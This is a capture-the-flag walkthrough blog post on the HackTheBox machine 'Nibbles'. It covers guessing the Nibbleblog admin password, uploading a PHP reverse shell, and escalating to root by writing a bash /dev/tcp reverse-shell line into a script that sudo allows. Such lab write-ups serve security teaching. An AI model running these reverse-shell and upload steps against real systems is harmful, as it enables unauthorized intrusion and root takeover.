---
title: Nibbles - HackTheBox Walkthrough
author: Degr4ne
date: 2021-10-18 12:00:00 
categories: [HackTheBox,Linux]
tags: [sudo]
math: false
mermaid: false
image:
  src: /assets/img/HTB/Nibbles/00-banner.png
  width: 593
  height: 354
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Nibbles` a machine by HackTheBox rated easy. Without further ado, let’s begin.

# Recon
## Nmap Scan
As always we'll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Fri Oct  8 19:28:34 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.232.219
Increasing send delay for 10.129.232.219 from 0 to 5 due to 56 out of 185 dropped probes since last increase.
Nmap scan report for 10.129.232.219
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  8 19:29:10 2021 -- 1 IP address (1 host up) scanned in 35.66 seconds
```

Two ports are open 22 and 80 running SSH and HTTP.

## HTTP Enumeration

![01-web](/assets/img/HTB/Nibbles/01-web.png)

On the web site just there a message: 'Hello World!', but the interesting thing is a comment on the source code showing a directory `/nibbleblog`.

![02-nibbles](/assets/img/HTB/Nibbles/02-nibbles.png)

Seems this site is powered by [Nibbleblog](https://github.com/dignajar/nibbleblog)

![03-vulns](/assets/img/HTB/Nibbles/03-vulns.png)

And is vulnerable to an Arbitrary File Upload but for this we need credentials.
The login page is on `/admin.php`, I tried 'admin/admin', 'admin/password' and 'admin/machine's name' in this case is `nibbles`.

User| Password
-|-
admin| nibbles

![04-access](/assets/img/HTB/Nibbles/04-access.png)

# Initial Foothold

We can find a reverse shell on `/usr/share/webshells/php/php-reverse-.shell.php`, let´s configure our php reverse shell changing the ip and our listener port, once it's done just upload the file.

![05-php](/assets/img/HTB/Nibbles/05-php.png)

Start a netcat listener on port 443, and click on `image.php` to get a shell.

![06-image](/assets/img/HTB/Nibbles/06-image.png)

For a interactive shell run this commands:

```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
$   ^Z
$ stty raw -echo;fg
$	reset
$ export TERM=xterm
$ export SHELL=bash
```

In nibbler's home directory there a zip file.

![07-ls](/assets/img/HTB/Nibbles/07-ls.png)

# Privilage Escalation

When we unzip this file it create `personal/stuff/monitor.sh` script.

![08-zip](/assets/img/HTB/Nibbles/08-zip.png)

`sudo -l` show us that we can execute this script as the user root without password.

![09-sudo](/assets/img/HTB/Nibbles/09-sudo.png)

As we are the owners of this file we can insert a reverse shell into it.

```console
$ echo '#!/bin/bash' > monitor.sh
$ echo 'bash -i >& /dev/tcp/10.10.14.39/443 0>&1' >> monitor.sh
$ sudo /home/nibbler/personal/stuff/monitor.sh
```

![10-script](/assets/img/HTB/Nibbles/10-script.png)

Just need a netcat listener on port 443 to get the shell.

![11-root](/assets/img/HTB/Nibbles/11-root.png)

Now we can read the flag.
That’s it for now guys. Until next time.
